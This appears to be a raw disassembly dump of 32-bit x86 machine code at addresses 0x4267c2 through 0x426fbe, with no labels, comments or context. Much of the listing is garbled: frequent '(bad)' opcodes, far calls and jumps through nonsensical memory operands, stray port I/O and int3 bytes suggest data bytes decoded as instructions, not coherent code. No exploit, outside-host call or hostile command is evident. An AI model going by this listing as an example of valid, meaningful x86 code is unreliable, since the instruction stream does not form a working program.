  4267c2:	add    bh,bh
  4267c4:	add    DWORD PTR [ecx-0x1cd4db],ecx
  4267ca:	inc    DWORD PTR [ebx+0x71c9ff9a]
  4267d0:	mov    eax,0x2d00ff89
  4267d5:	cmp    DWORD PTR [eax-0x3b],0xffffff94
  4267d9:	dec    DWORD PTR [ecx+0x30097ff]
  4267df:	repnz cdq 
  4267e1:	add    BYTE PTR [eax],al
  4267e3:	sub    DWORD PTR [edi+edi*8-0x7c237b2f],0xffffffff
  4267eb:	add    BYTE PTR [edx+0x0],ah
  4267ee:	jbe    0x42677f
  4267f0:	fcos   
  4267f2:	add    BYTE PTR [ebx-0x185a0083],al
  4267f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4267f9:	add    BYTE PTR [eax],al
  4267fb:	or     DWORD PTR [ecx+0x0],0x6f
  4267ff:	fnstsw WORD PTR [esi]
  426801:	inc    DWORD PTR [eax]
  426803:	(bad)  
  426804:	jge    0x42678f
  426806:	mov    bl,0xd8
  426808:	dec    edi
  426809:	inc    DWORD PTR [eax]
  42680b:	add    BYTE PTR [edi],dl
  42680d:	jmp    DWORD PTR [ecx-0xff4c16]
  426813:	add    BYTE PTR [eax+0x0],bl
  426816:	xchg   esi,eax
  426817:	pop    es
  426818:	loop   0x42679d
  42681a:	inc    DWORD PTR [eax]
  42681c:	popa   
  42681d:	call   FWORD PTR [edx]
  42681f:	test   esp,0x9bffff00
  426825:	add    BYTE PTR [ecx+0x1d],ah
  426828:	dec    esp
  426829:	(bad)  
  42682a:	inc    DWORD PTR [eax]
  42682c:	mov    esp,0xaa588eff
  426831:	add    BYTE PTR [ebx-0x2576ae7d],al
  426837:	stos   DWORD PTR es:[edi],eax
  426838:	dec    edi
  426839:	(bad)  
  42683a:	inc    DWORD PTR [eax]
  42683c:	loope  0x42683d
  42683e:	repz xchg ebp,eax
  426840:	and    al,0xff
  426842:	(bad)  
  426843:	push   DWORD PTR [edx-0x182ab601]
  426849:	add    BYTE PTR [eax],al
  42684b:	add    BYTE PTR [edx],al
  42684d:	call   DWORD PTR [ebp+0x52]
  426850:	les    eax,FWORD PTR [eax]
  426852:	dec    DWORD PTR [ecx-0x20900c0]
  426858:	cmp    bh,0x0
  42685b:	mov    DWORD PTR [edi+0x73c2f5ff],edi
  426861:	mov    DWORD PTR [eax],eax
  426863:	add    BYTE PTR [ecx-0x39096601],cl
  426869:	(bad)  
  42686a:	inc    DWORD PTR [ebx-0x2d7b0063]
  426870:	adc    eax,DWORD PTR [eax]
  426872:	add    bh,bh
  426874:	mov    esp,cs
  426876:	or     al,0x9f
  426878:	mov    dh,0xcc
  42687a:	add    DWORD PTR [eax],0xffffffd8
  42687d:	int3   
  42687e:	or     DWORD PTR [ecx],0xffffffb7
  426881:	add    bh,bh
  426883:	inc    DWORD PTR [edx-0x7cc43b01]
  426889:	add    BYTE PTR [ebx+0x64835fff],al
  42688f:	pop    es
  426890:	hlt    
  426891:	add    bh,bh
  426893:	int3   
  426894:	dec    esi
  426895:	mov    DWORD PTR [ebx+0x890e64],esi
  42689b:	call   FWORD PTR [edi+0x0]
  42689e:	(bad)  
  4268a0:	ret    
  4268a1:	inc    DWORD PTR [ebx+0x3d006500]
  4268a7:	jp     0x42686c
  4268a9:	(bad)  
  4268aa:	inc    DWORD PTR [ebx+0x5924ccee]
  4268b0:	mov    esi,0xd78983ff
  4268b5:	mov    DWORD PTR [edi-0xffdc9e],esp
  4268bb:	push   DWORD PTR [ecx+ecx*4-0x717873]
  4268c2:	(bad)  
  4268c3:	jmp    DWORD PTR [ebx]
  4268c5:	call   edx
  4268c7:	sub    al,0x6e
  4268c9:	add    DWORD PTR [ebx+0x4c834200],0xffffffbe
  4268d0:	ins    BYTE PTR es:[edi],dx
  4268d1:	add    bh,bh
  4268d3:	add    BYTE PTR [ecx],bl
  4268d5:	inc    DWORD PTR [ebp-0x15]
  4268d8:	pop    edi
  4268d9:	add    BYTE PTR [ebx+0x30ffbfcc],al
  4268df:	pushf  
  4268e0:	into   
  4268e1:	add    ah,cl
  4268e3:	add    al,al
  4268e5:	inc    DWORD PTR [ecx]
  4268e7:	loop   0x4268b6
  4268e9:	(bad)  
  4268ea:	(bad)  
  4268eb:	inc    DWORD PTR [esi]
  4268ed:	push   DWORD PTR [ebx-0x7c66f8]
  4268f3:	add    BYTE PTR [ecx+0x0],bl
  4268f6:	jg     0x426961
  4268f8:	push   ss
  4268f9:	add    BYTE PTR [eax],al
  4268fb:	add    BYTE PTR [ebx],cl
  4268fd:	call   FWORD PTR [edi+0x48]
  426900:	jg     0x4268ce
  426902:	int3   
  426903:	call   FWORD PTR [ecx-0x1]
  426906:	dec    esp
  426907:	push   cs
  426908:	mov    dl,0xcc
  42690a:	(bad)  
  42690b:	jmp    esi
  42690d:	(bad)  
  42690e:	cli    
  42690f:	jb     0x4268ea
  426911:	inc    DWORD PTR [ebx+0x4500e883]
  426917:	xor    DWORD PTR [edx+0x0],ebx
  42691a:	add    BYTE PTR [ebx+0x8188328],al
  426920:	xchg   BYTE PTR [eax],al
  426922:	int3   
  426923:	jmp    FWORD PTR [edi]
  426925:	dec    edi
  426927:	sub    BYTE PTR [eax-0x1],al
  42692a:	add    BYTE PTR [eax],al
  42692c:	xchg   BYTE PTR [eax],al
  42692e:	cli    
  42692f:	and    al,0x3c
  426931:	inc    DWORD PTR [eax]
  426933:	add    BYTE PTR ds:0x36334a00,ah
  426939:	(bad)  
  42693a:	inc    DWORD PTR [eax]
  42693c:	inc    esp
  42693d:	add    BYTE PTR [esp+eiz*8-0xc4],bl
  426944:	(bad)  
  426945:	dec    esi
  426947:	push   edi
  426948:	pop    esp
  426949:	int3   
  42694a:	add    BYTE PTR [eax],al
  42694c:	mov    ebp,0x43fd23ff
  426951:	add    BYTE PTR [ebx-0x6200017d],al
  426957:	inc    ebx
  426958:	mov    bh,0x89
  42695a:	(bad)  
  42695b:	push   edi
  42695d:	cmp    DWORD PTR [eax-0xc65],0xffffffcc
  426964:	push   cs
  426965:	call   FWORD PTR [edx-0x7600d578]
  42696b:	add    ah,ah
  42696d:	int3   
  42696e:	fist   DWORD PTR [ecx+0x45]
  426971:	add    BYTE PTR [eax],al
  426973:	call   FWORD PTR [edx-0x34]
  426976:	pop    esp
  426977:	popa   
  426978:	dec    edx
  426979:	(bad)  
  42697a:	dec    esp
  42697c:	arpl   di,di
  42697e:	js     0x42692c
  426980:	push   edi
  426981:	inc    DWORD PTR [eax]
  426983:	add    DWORD PTR [edi+edi*8-0x2c],0x4b
  426988:	in     al,dx
  426989:	int3   
  42698a:	add    BYTE PTR [eax],al
  42698c:	mov    edx,0x11b7a7ff
  426991:	inc    DWORD PTR [ebx-0x2fff1a34]
  426997:	and    ebp,DWORD PTR [edx-0x7d]
  42699a:	add    bh,bh
  42699c:	ret    
  42699d:	and    DWORD PTR [edi-0x50],0xffffffb6
  4269a1:	int3   
  4269a2:	cmp    edi,0x18
  4269a5:	(bad)  
  4269a6:	call   0x42142f
  4269ab:	push   DWORD PTR [eax-0x34]
  4269ae:	push   edi
  4269af:	repnz gs mov edi,edi
  4269b3:	add    BYTE PTR [ebp+0x5547e900],al
  4269b9:	int3   
  4269ba:	(bad)  
  4269bb:	jmp    FWORD PTR [esi]
  4269bd:	(bad)  
  4269be:	cmp    al,0xce
  4269c0:	xor    DWORD PTR [eax],eax
  4269c2:	add    DWORD PTR [ebx-0x5b440090],0x79
  4269c9:	dec    esp
  4269cb:	add    ah,bl
  4269cd:	mov    DWORD PTR [edx-0x12],ebx
  4269d0:	lods   al,BYTE PTR ds:[esi]
  4269d1:	cmp    edi,0xffffff83
  4269d4:	mov    eax,ds:0x44862eff
  4269d9:	inc    DWORD PTR [ebx+0x7200dbff]
  4269df:	test   eax,0xcc00fff2
  4269e4:	call   0x8300:0xfea134ff
  4269eb:	add    BYTE PTR [ebx+0x745c89cc],ah
  4269f1:	inc    DWORD PTR [ebx+0x57ff88ff]
  4269f7:	mov    esi,0xff00ff1d
  4269fc:	pop    esp
  4269fd:	call   DWORD PTR [edx+0x8999ac]
  426a03:	int3   
  426a04:	jo     0x426989
  426a06:	mov    ebp,0xff831f4a
  426a0b:	(bad)  
  426a0c:	jle    0x426a0e
  426a0e:	into   
  426a0f:	mov    DWORD PTR [ebp-0x1],eax
  426a12:	(bad)  
  426a13:	dec    DWORD PTR [esi-0x31edde34]
  426a19:	inc    DWORD PTR [eax]
  426a1b:	push   DWORD PTR [eax]
  426a1d:	add    bl,dh
  426a1f:	(bad)
  426a24:	fiadd  WORD PTR [eax]
  426a26:	cdq    
  426a27:	inc    esp
  426a28:	mov    al,ds:0x8eff8983
  426a2d:	add    BYTE PTR [ebx],al
  426a2f:	adc    al,0x7
  426a31:	(bad)  
  426a32:	(bad)  
  426a33:	jmp    DWORD PTR [ecx-0x7d]
  426a36:	shr    DWORD PTR [ebp+0x78],cl
  426a39:	mov    edi,edi
  426a3b:	jmp    DWORD PTR [esi+0x14e87eff]
  426a41:	add    BYTE PTR [eax],al
  426a43:	add    BYTE PTR [ebx-0x54243d7d],ah
  426a49:	dec    DWORD PTR [ecx-0x7e001e01]
  426a4f:	js     0x426a9e
  426a51:	add    bh,bh
  426a53:	call   ebp
  426a55:	mov    DWORD PTR [ecx-0x33f13a],edx
  426a5b:	add    BYTE PTR [edi+0x6472a383],cl
  426a61:	add    bh,bh
  426a63:	adc    DWORD PTR [edi],0xffffffff
  426a66:	or     al,0x8d
  426a68:	popf   
  426a69:	(bad)  
  426a6a:	inc    DWORD PTR [ebx+0x79aff6a]
  426a70:	aas    
  426a71:	dec    esp
  426a73:	add    BYTE PTR [eax],ah
  426a75:	mov    ecx,edx
  426a77:	jg     0x426aa7
  426a79:	int3   
  426a7a:	inc    DWORD PTR [eax]
  426a7c:	xor    eax,0x5d682900
  426a81:	inc    DWORD PTR [eax]
  426a83:	int3   
  426a84:	dec    edi
  426a85:	dec    DWORD PTR [esi]
  426a87:	je     0x426aa0
  426a89:	add    DWORD PTR [ebx-0x3533c200],0xffffffcc
  426a90:	jecxz  0x426a91
  426a92:	(bad)  
  426a93:	dec    esp
  426a95:	push   DWORD PTR [edx]
  426a97:	xor    ebx,ecx
  426a99:	(bad)  
  426a9a:	inc    DWORD PTR [eax]
  426a9c:	inc    ebx
  426a9d:	sub    DWORD PTR [ecx-0x7c00e190],0x0
  426aa4:	pop    ebx
  426aa5:	inc    eax
  426aa7:	loop   0x426aea
  426aa9:	inc    DWORD PTR [eax]
  426aab:	add    BYTE PTR [ecx+ecx*4-0x57],dl
  426aaf:	mov    eax,ds:0x89ff89fd
  426ab4:	cmp    edi,edi
  426ab6:	adc    eax,0xff001e3f
  426abb:	int3   
  426abc:	nop
  426abd:	call   FWORD PTR [esi+0xffc637]
  426ac3:	call   FWORD PTR [edi]
  426ac5:	inc    DWORD PTR [esp+esi*8]
  426ac8:	stos   BYTE PTR es:[edi],al
  426ac9:	(bad)  
  426aca:	(bad)  
  426acb:	jmp    FWORD PTR [esi-0x1]
  426ace:	out    0x8d,al
  426ad0:	rol    BYTE PTR [ebx-0x7c7c7d00],1
  426ad6:	xor    BYTE PTR [ecx],bh
  426ad8:	test   edi,edi
  426ada:	add    BYTE PTR [eax],al
  426adc:	loope  0x426ade
  426ade:	jns    0x426b30
  426ae0:	in     eax,0x83
  426ae2:	(bad)  
  426ae3:	inc    DWORD PTR [ecx+0x61d17dff]
  426ae9:	(bad)  
  426aea:	inc    DWORD PTR [eax]
  426aec:	cli    
  426aed:	call   FWORD PTR [eax-0xff0dc9]
  426af3:	mov    DWORD PTR ds:0x2d46e700,edx
  426af9:	add    ah,cl
  426afb:	call   FWORD PTR [ebp+0x5e892c83]
  426b01:	(bad)  
  426b02:	inc    DWORD PTR [eax]
  426b04:	test   bh,bh
  426b06:	add    DWORD PTR [esp+ecx*4+0x0],ebx
  426b0a:	(bad)  
  426b0b:	inc    esp
  426b0d:	dec    DWORD PTR [eax-0x69]
  426b10:	iret   
  426b11:	inc    DWORD PTR [eax]
  426b13:	or     DWORD PTR [ecx+0x0],0xffffffdc
  426b17:	stc    
  426b18:	loope  0x426b1a
  426b1a:	mov    esp,ecx
  426b1c:	leave  
  426b1d:	add    BYTE PTR [ebx-0xae46],dh
  426b23:	(bad)  
  426b24:	std    
  426b25:	add    BYTE PTR [ecx],dl
  426b27:	call   DWORD PTR [ebp-0x1]
  426b2a:	add    BYTE PTR [ebx+0x38ebffd0],al
  426b30:	aas    
  426b31:	add    DWORD PTR [eax],0xffffffcc
  426b34:	inc    ebx
  426b35:	inc    DWORD PTR [eax+ebx*8]
  426b38:	loope  0x426abd
  426b3a:	mov    DWORD PTR [eax],eax
  426b3c:	(bad)  
  426b3d:	add    BYTE PTR [ebx],ah
  426b3f:	test   al,0x6e
  426b41:	inc    DWORD PTR [eax]
  426b43:	int3   
  426b44:	popf   
  426b45:	add    ch,dl
  426b47:	and    dh,bh
  426b49:	inc    DWORD PTR [ebx+0x10ff81cc]
  426b4f:	jae    0x426b39
  426b51:	add    BYTE PTR [ebx-0x44008400],al
  426b57:	xchg   esp,eax
  426b58:	mov    bh,bh
  426b5a:	(bad)  
  426b5b:	inc    DWORD PTR [ecx-0x28ce707d]
  426b61:	int3   
  426b62:	dec    esp
  426b64:	pop    eax
  426b65:	add    BYTE PTR [edi+0x89ca54],ch
  426b6b:	dec    edx
  426b6d:	jmp    FWORD PTR [eax-0x7ca80d]
  426b73:	add    ch,bl
  426b75:	push   ebp
  426b77:	sbb    al,0x7a
  426b79:	add    DWORD PTR [ebx-0x5700fc00],0x33
  426b80:	call   0x5aff:0xcc8300ff
  426b87:	jne    0x426bbf
  426b89:	add    bh,bh
  426b8b:	mov    DWORD PTR [edi],esp
  426b8d:	inc    DWORD PTR [esi-0x8]
  426b90:	hlt    
  426b91:	add    BYTE PTR [eax],al
  426b93:	call   DWORD PTR [ebx+0x0]
  426b96:	fstp   QWORD PTR [ecx+0x4d]
  426b99:	mov    edi,edi
  426b9b:	int3   
  426b9c:	add    bh,bh
  426b9e:	adc    al,0x78
  426ba0:	jae    0xdff5a5
  426ba6:	in     al,0xc8
  426ba8:	push   ecx
  426ba9:	mov    esp,ecx
  426bab:	inc    DWORD PTR [edx+0xadb62ff]
  426bb1:	(bad)  
  426bb2:	inc    DWORD PTR [eax]
  426bb4:	aad    0x83
  426bb6:	cmp    BYTE PTR [ebx+0x1c],al
  426bb9:	inc    DWORD PTR [eax]
  426bbb:	jmp    DWORD PTR [edi+edi*8]
  426bbe:	scas   al,BYTE PTR es:[edi]
  426bbf:	sbb    dh,BYTE PTR [edx-0x34]
  426bc2:	(bad)  
  426bc3:	(bad)  
  426bc4:	jp     0x426bc5
  426bc6:	sub    DWORD PTR [eax],0xffffff90
  426bc9:	inc    DWORD PTR [ebx-0x25330434]
  426bcf:	pop    eax
  426bd0:	push   edx
  426bd1:	(bad)  
  426bd2:	inc    DWORD PTR [eax]
  426bd4:	push   eax
  426bd5:	sub    ebp,0xffffff86
  426bd8:	add    BYTE PTR ds:[eax],al
  426bdb:	inc    DWORD PTR [ecx+ecx*4-0xa74b63]
  426be2:	(bad)  
  426be3:	dec    DWORD PTR [edx-0x4ba27001]
  426be9:	add    BYTE PTR [eax],al
  426beb:	add    BYTE PTR [edi+0x288f4283],dh
  426bf1:	(bad)  
  426bf2:	(bad)  
  426bf3:	call   FWORD PTR [ebx-0x52167f00]
  426bf9:	add    bh,bh
  426bfb:	add    BYTE PTR [edx+0x62cad0ff],ah
  426c01:	inc    DWORD PTR [eax]
  426c03:	int3   
  426c04:	pusha  
  426c05:	inc    ebx
  426c07:	daa    
  426c08:	dec    ebx
  426c09:	add    BYTE PTR [ebx-0x3c008200],al
  426c0f:	dec    edx
  426c10:	mov    edi,0xdd00ff83
  426c15:	add    cl,dh
  426c17:	push   es
  426c18:	aad    0xff
  426c1a:	int3   
  426c1b:	jmp    DWORD PTR [esi]
  426c1d:	xor    DWORD PTR [ebx-0xff75fe],0x0
  426c24:	and    al,BYTE PTR [ebx+0x7a20a4]
  426c2a:	add    bh,bh
  426c2c:	cwde   
  426c2d:	add    BYTE PTR [eax+0xb],bh
  426c30:	xchg   ecx,eax
  426c31:	inc    DWORD PTR [ebx+0x60ff8c00]
  426c37:	cmp    eax,0xffff5d
  426c3c:	into   
  426c3d:	cmp    DWORD PTR [edi+0xccb6cf],0xffffff83
  426c44:	and    eax,DWORD PTR [ebx+0x4770d]
  426c4a:	int3   
  426c4b:	push   DWORD PTR [eax+0x35542583]
  426c51:	(bad)  
  426c52:	inc    DWORD PTR [eax]
  426c54:	xlat   BYTE PTR ds:[ebx]
  426c55:	dec    DWORD PTR [edx+0xff28fe]
  426c5b:	adc    ebp,0x0
  426c5e:	inc    edx
  426c5f:	rcr    bh,cl
  426c61:	inc    DWORD PTR [eax]
  426c63:	add    BYTE PTR [eax+0x0],cl
  426c66:	cmp    BYTE PTR [esi-0x4b],0xff
  426c6a:	(bad)  
  426c6b:	call   FWORD PTR [eax+0x78aa6dff]
  426c71:	add    BYTE PTR [eax],al
  426c73:	mov    DWORD PTR [edi],esp
  426c75:	add    ch,ah
  426c77:	retf   
  426c78:	push   esp
  426c79:	add    bh,bh
  426c7b:	add    bl,ch
  426c7d:	adc    DWORD PTR [ecx+ebx*4-0xff0052],0xffffff95
  426c85:	add    ah,bh
  426c87:	xchg   esi,eax
  426c88:	inc    esi
  426c89:	add    BYTE PTR [eax],al
  426c8b:	sub    DWORD PTR [edx-0x1],0x11
  426c8f:	jg     0x426c4c
  426c91:	add    BYTE PTR [ebx+0x3cff74ff],al
  426c97:	or     al,0x83
  426c99:	add    DWORD PTR [eax],0xffffffcc
  426c9c:	add    al,0xcc
  426c9e:	out    dx,eax
  426c9f:	fcomip st,st(1)
  426ca1:	(bad)  
  426ca2:	inc    DWORD PTR [ebx+0x38b0ccf6]
  426ca8:	add    ecx,DWORD PTR [ecx-0xeeff01]
  426cae:	add    ecx,DWORD PTR [ebp-0x3a]
  426cb1:	mov    edi,edi
  426cb3:	sbb    DWORD PTR [ebx-0x1],0xffffffbf
  426cb7:	ja     0x426cff
  426cb9:	inc    DWORD PTR [eax]
  426cbb:	add    BYTE PTR [ebx-0x1],al
  426cbe:	mov    bh,0x9d
  426cc0:	imul   edi,edi,0xcb00ff
  426cc6:	jo     0x426cb7
  426cc8:	sub    eax,0xb800ffff
  426ccd:	int3   
  426cce:	gs xchg esi,eax
  426cd0:	cmc    
  426cd1:	(bad)  
  426cd2:	(bad)  
  426cd3:	call   DWORD PTR [ecx-0x33017900]
  426cd9:	inc    DWORD PTR [eax]
  426cdb:	jmp    FWORD PTR [esi-0x1]
  426cde:	mov    eax,ds:0xffffb011
  426ce3:	jmp    FWORD PTR [ebp-0x77]
  426ce6:	out    0x58,al
  426ce8:	nop
  426ce9:	add    DWORD PTR [eax],0xffffff89
  426cec:	mov    esi,0x17cf8c00
  426cf1:	dec    esp
  426cf3:	mov    ebx,esi
  426cf5:	add    BYTE PTR [ebx+edi*8],dh
  426cf8:	addr16 (bad) 
  426cfa:	(bad)  
  426cfb:	(bad)  
  426cfc:	cmp    al,BYTE PTR [eax]
  426cfe:	nop
  426cff:	xor    bl,dl
  426d01:	cmp    edi,0x0
  426d04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d05:	push   DWORD PTR [ecx-0x3ffb]
  426d0b:	cmp    DWORD PTR [esi+0x66743ecc],0xffffff83
  426d12:	add    bh,bh
  426d14:	ja     0x426c99
  426d16:	xor    al,0x1a
  426d18:	jne    0x426c9d
  426d1a:	dec    DWORD PTR [ecx+0x2082ffc4]
  426d20:	jno    0x426cee
  426d22:	dec    esp
  426d24:	add    edi,edi
  426d26:	sub    al,0xea
  426d28:	ror    esp,1
  426d2a:	add    bh,bh
  426d2c:	sbb    al,0xcc
  426d2e:	bound  ecx,QWORD PTR [ebx+0x72]
  426d31:	(bad)  
  426d32:	(bad)  
  426d33:	jmp    FWORD PTR [ebp+0x0]
  426d36:	and    esi,edi
  426d38:	(bad)  
  426d39:	(bad)  
  426d3a:	inc    DWORD PTR [eax]
  426d3c:	jnp    0x426d3d
  426d3e:	gs mov edi,0xffff00f5
  426d44:	lahf   
  426d45:	call   FWORD PTR [ebx+0x14]
  426d48:	fmul   st(4),st
  426d4a:	add    DWORD PTR [ebx+0x592cffeb],0x2e
  426d51:	int3   
  426d52:	mov    DWORD PTR [ebx+0x1ddaffe9],eax
  426d58:	xlat   BYTE PTR ds:[ebx]
  426d59:	(bad)  
  426d5a:	(bad)  
  426d5b:	call   DWORD PTR [esi-0x1fc7e601]
  426d61:	add    bh,bh
  426d63:	or     ecx,0x0
  426d66:	test   BYTE PTR [edi+0x2b],0xff
  426d6a:	add    BYTE PTR [eax],al
  426d6c:	imul   eax,DWORD PTR [eax],0x833ff9c8
  426d72:	add    bh,bh
  426d74:	test   al,0x83
  426d76:	mov    ds:0x89008290,al
  426d7b:	jmp    DWORD PTR [edi+edi*8+0x73]
  426d7f:	repnz repnz (bad) 
  426d82:	(bad)  
  426d83:	dec    DWORD PTR ds:0xa8025089
  426d89:	add    bh,bh
  426d8b:	add    BYTE PTR [esi],cl
  426d8d:	add    BYTE PTR [ecx-0x25],bl
  426d90:	add    eax,0xb6ff00ff
  426d95:	and    DWORD PTR [esp],0x2d
  426d99:	inc    DWORD PTR [eax]
  426d9b:	add    BYTE PTR [edi+edi*8],al
  426d9e:	pop    es
  426d9f:	popf   
  426da0:	ins    BYTE PTR es:[edi],dx
  426da1:	(bad)  
  426da2:	(bad)  
  426da3:	push   edi
  426da5:	add    BYTE PTR [edx+0x71ff],al
  426dab:	mov    esp,ebp
  426dad:	adc    esi,0x9
  426db0:	jle    0x426db1
  426db2:	add    DWORD PTR [eax],0x5d
  426db5:	(bad)  
  426db6:	jnp    0x426d91
  426db8:	out    dx,eax
  426db9:	mov    edi,edi
  426dbb:	add    BYTE PTR [esp+ecx*8-0x7654cf4d],cl
  426dc2:	add    BYTE PTR [ecx+0x6babffa6],cl
  426dc8:	call   0x70416ecc
  426dcd:	add    BYTE PTR [edi],dh
  426dcf:	add    ebx,esp
  426dd1:	int3   
  426dd2:	cmp    edi,0x78
  426dd5:	dec    esp
  426dd7:	out    0x92,eax
  426dd9:	(bad)  
  426dda:	(bad)  
  426ddb:	call   DWORD PTR [ebx-0x5ff5cb01]
  426de1:	mov    DWORD PTR [eax],eax
  426de3:	jmp    DWORD PTR [eax+0x2d468e00]
  426de9:	add    bh,bh
  426deb:	add    BYTE PTR [ecx-0x1],dl
  426dee:	retf   
  426def:	bound  ecx,QWORD PTR [ebx+0x5ccc0000]
  426df5:	jmp    FWORD PTR [eax-0x2c]
  426df8:	lds    eax,FWORD PTR [ebx-0x7c540001]
  426dfe:	jne    0x426daf
  426e00:	pop    ds
  426e01:	dec    esp
  426e03:	add    BYTE PTR [ebx-0x1],dl
  426e06:	push   0x19
  426e08:	inc    edi
  426e09:	(bad)  
  426e0a:	(bad)  
  426e0b:	dec    DWORD PTR [esi-0x2625134]
  426e11:	(bad)  
  426e12:	(bad)  
  426e13:	inc    DWORD PTR [eax-0x77]
  426e16:	jmp    0x5ff:0xff834293
  426e1d:	jmp    edi
  426e1f:	shl    DWORD PTR [eax-0x34],0x0
  426e23:	sbb    DWORD PTR [edi-0x4394d601],0x0
  426e2a:	dec    esp
  426e2c:	sar    edi,0x4d
  426e2f:	outs   dx,DWORD PTR ds:[esi]
  426e30:	jnp    0x426e32
  426e32:	mov    edi,edi
  426e34:	mov    esp,0x41d3c189
  426e39:	add    bh,bh
  426e3b:	sbb    DWORD PTR [edx],0xffffffff
  426e3e:	jle    0x426e0f
  426e40:	push   ecx
  426e41:	(bad)  
  426e42:	(bad)  
  426e43:	(bad)  
  426e44:	jp     0x426dcf
  426e46:	outs   dx,BYTE PTR ds:[esi]
  426e47:	pop    edi
  426e48:	inc    edx
  426e49:	int3   
  426e4a:	add    BYTE PTR [eax],al
  426e4c:	cmc    
  426e4d:	xor    DWORD PTR [eax-0xffe8a8],0xffffffff
  426e54:	xor    al,0x89
  426e56:	xchg   edx,eax
  426e57:	mov    ds:0x8383ffac,al
  426e5c:	loop   0x426e5d
  426e5e:	out    0xf7,eax
  426e60:	dec    ecx
  426e61:	dec    DWORD PTR [ecx-0x6f000a01]
  426e67:	in     al,0xc0
  426e69:	(bad)  
  426e6a:	(bad)  
  426e6b:	jmp    edi
  426e6d:	dec    ecx
  426e6f:	mov    WORD PTR [eax],cs
  426e71:	mov    DWORD PTR [eax],eax
  426e73:	adc    esp,0xffffffff
  426e76:	inc    eax
  426e77:	lods   al,BYTE PTR ds:[esi]
  426e78:	xlat   BYTE PTR ds:[ebx]
  426e79:	(bad)  
  426e7a:	(bad)  
  426e7b:	(bad)  
  426e7c:	mov    ebp,0xa21cff
  426e81:	inc    DWORD PTR [eax]
  426e83:	int3   
  426e84:	(bad)  
  426e85:	call   edi
  426e87:	fs int 0x83
  426e8a:	inc    DWORD PTR [ebx-0x624a7c6c]
  426e90:	in     al,dx
  426e91:	(bad)  
  426e92:	(bad)  
  426e93:	push   DWORD PTR [ecx-0x34]
  426e96:	lock pop ecx
  426e98:	or     al,0xcc
  426e9a:	add    BYTE PTR [eax],al
  426e9c:	or     ah,0x40
  426e9f:	xor    al,0x46
  426ea1:	add    ah,cl
  426ea3:	sub    DWORD PTR [edi],0xffffffff
  426ea6:	mov    ebx,DWORD PTR [esi-0x33007c55]
  426eac:	xchg   edi,eax
  426ead:	xor    DWORD PTR [esi+0x65],0xffffffde
  426eb1:	inc    DWORD PTR [ebx-0x29004601]
  426eb7:	pop    ss
  426eb8:	ins    DWORD PTR es:[edi],dx
  426eb9:	inc    DWORD PTR [ebx+0x4acc8783]
  426ebf:	call   0x9e:0x830085
  426ec6:	bound  edx,QWORD PTR [esi-0x76ff7a]
  426ecc:	jns    0x426ece
  426ece:	jecxz  0x426e83
  426ed0:	or     bh,bh
  426ed2:	add    bh,bh
  426ed4:	sar    bh,0x7c
  426ed7:	pop    ebp
  426ed8:	pop    edi
  426ed9:	or     esp,0xffffff83
  426edc:	mov    BYTE PTR [ecx-0x33216a1c],cl
  426ee2:	inc    DWORD PTR [eax]
  426ee4:	adc    eax,DWORD PTR [eax]
  426ee6:	or     BYTE PTR [ecx-0xffff42],bh
  426eec:	mov    ecx,0x7380dfff
  426ef1:	int3   
  426ef2:	add    BYTE PTR [eax],al
  426ef4:	loop   0x426e79
  426ef6:	mov    cl,0x54
  426ef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ef9:	inc    DWORD PTR [ebx+0x6cff64ff]
  426eff:	push   es
  426f00:	pop    eax
  426f01:	cmp    edi,0x0
  426f04:	(bad)  
  426f05:	call   eax
  426f07:	jbe    0x426f42
  426f09:	(bad)  
  426f0a:	(bad)  
  426f0b:	(bad)  
  426f0c:	fdivp  st(7),st
  426f0e:	or     BYTE PTR [edx],dh
  426f10:	leave  
  426f11:	add    BYTE PTR [ecx-0x13339b00],cl
  426f17:	jb     0x426eb6
  426f19:	add    bh,bh
  426f1b:	sub    DWORD PTR [edi+0x0],0x34
  426f1f:	dec    ebx
  426f20:	pop    es
  426f21:	int3   
  426f22:	dec    DWORD PTR [ecx-0x4e8a0034]
  426f28:	nop
  426f29:	add    bh,bh
  426f2b:	inc    DWORD PTR [ebx+0x0]
  426f2e:	leave  
  426f2f:	jb     0x426f44
  426f31:	add    bh,bh
  426f33:	int3   
  426f34:	pop    eax
  426f35:	push   DWORD PTR [ecx+0xff72b9]
  426f3b:	mov    DWORD PTR [ecx],esi
  426f3d:	add    BYTE PTR [edi-0x12],dh
  426f40:	cmp    DWORD PTR [eax],eax
  426f42:	(bad)  
  426f43:	jmp    ecx
  426f45:	mov    DWORD PTR [ecx+0x2e],ebp
  426f48:	xchg   edi,eax
  426f49:	inc    DWORD PTR [eax]
  426f4b:	mov    DWORD PTR [edx],esp
  426f4d:	jmp    FWORD PTR [ebx+0xff9d6d]
  426f53:	push   DWORD PTR [ebx-0x621d0634]
  426f59:	add    bh,bh
  426f5b:	call   FWORD PTR [ebx]
  426f5d:	adc    DWORD PTR [edx-0x3370f6],0x0
  426f64:	std    
  426f65:	add    bh,dh
  426f67:	ins    BYTE PTR es:[edi],dx
  426f68:	fcos   
  426f6a:	add    bh,bh
  426f6c:	add    eax,DWORD PTR [eax]
  426f6e:	and    eax,0x83ff4f99
  426f73:	add    BYTE PTR [esi-0x1],bh
  426f76:	push   ebx
  426f77:	and    ebx,DWORD PTR [edi+edi*8]
  426f7a:	int3   
  426f7b:	add    cl,ah
  426f7d:	jmp    FWORD PTR [ecx-0x55]
  426f80:	jbe    0x426f81
  426f82:	add    ah,cl
  426f84:	inc    ebp
  426f85:	int3   
  426f86:	inc    eax
  426f87:	inc    edx
  426f88:	cmp    eax,0x5cffff00
  426f8d:	add    BYTE PTR [esi-0x7d],bl
  426f90:	cwde   
  426f91:	inc    DWORD PTR [eax]
  426f93:	call   DWORD PTR [edi-0x1]
  426f96:	lahf   
  426f97:	call   0xffc66eed
  426f9c:	je     0x426f9d
  426f9e:	mov    bh,0xda
  426fa0:	jl     0x426fa1
  426fa2:	dec    DWORD PTR [ecx+0x37d4ffc7]
  426fa8:	ret    
  426fa9:	add    BYTE PTR [eax],al
  426fab:	cmp    DWORD PTR [ecx],0x0
  426fae:	sbb    DWORD PTR [edi],eax
  426fb0:	js     0x426fb1
  426fb2:	int3   
  426fb3:	xor    ecx,0xffffffff
  426fb6:	ret    
  426fb7:	cli    
  426fb8:	into   
  426fb9:	mov    edi,edi
  426fbb:	jmp    FWORD PTR [edi+edi*8]
  426fbe:	pop    ds
